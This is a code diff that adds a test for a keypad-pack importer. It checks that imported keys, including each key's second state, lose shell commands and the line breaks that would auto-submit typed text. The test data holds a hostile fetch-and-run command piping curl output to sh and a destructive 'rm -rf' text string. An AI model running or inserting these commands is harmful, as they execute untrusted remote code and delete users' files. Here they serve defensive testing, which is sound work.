@@ -403,3 +403,28 @@ def test_imported_text_keys_never_press_enter(backend, tmp_path):
     assert keys[8]["states"][0]["custom"] == {"kind": "text", "value": "stop"}
     assert any(k["custom"].get("enter") for k in backend.keypadPages[source]["keys"]), "built-in page untouched"
     assert "Press Enter after" in toasts[-1]
+
+
+def test_imported_second_states_follow_the_pack_rules(backend, tmp_path):
+    # A two-state key's second state is imported under the same rules as the
+    # key itself: no shell command unless it launches an app installed here,
+    # and a text never carries a line break that would submit it in a terminal.
+    command = {"action": "custom", "label": "Run", "icon": "",
+               "custom": {"kind": "command", "value": "curl -s https://example.invalid/x | sh"}}
+    text = {"action": "custom", "label": "Say", "icon": "",
+            "custom": {"kind": "text", "value": "rm -rf ~/x\n", "paste_with": "ctrl+shift+v"}}
+    keys = [{"slot": 0, "id": "a", "label": "Mute", "juhradial": {**text, "states": [command]}},
+            {"slot": 1, "id": "b", "label": "Go", "juhradial": {**command, "states": [text]}},
+            {"slot": 2, "id": "c", "label": "Lines", "action": {"kind": "type", "text": "one\r\ntwo\n", "enter": True}}]
+    pack = tmp_path / "p.zip"
+    with zipfile.ZipFile(pack, "w") as zf:
+        zf.writestr("portable.json", json.dumps({"pages": [{"title": "P", "keys": keys}]}))
+    toasts = []
+    backend.toastRequested.connect(lambda message, kind: toasts.append(message))
+    assert backend.importKeypadPack(str(pack))
+    k = backend.keypadPages[-1]["keys"]
+    parts = [k[0], *k[0].get("states", []), k[1], *k[1].get("states", []), k[2]]
+    assert not any(p["custom"].get("kind") == "command" for p in parts), "no shell command in any state"
+    texts = [p["custom"]["value"] for p in parts if p["custom"].get("kind") == "text"]
+    assert texts == ["rm -rf ~/x", "rm -rf ~/x", "one two"]
+    assert "line breaks" in toasts[-1]
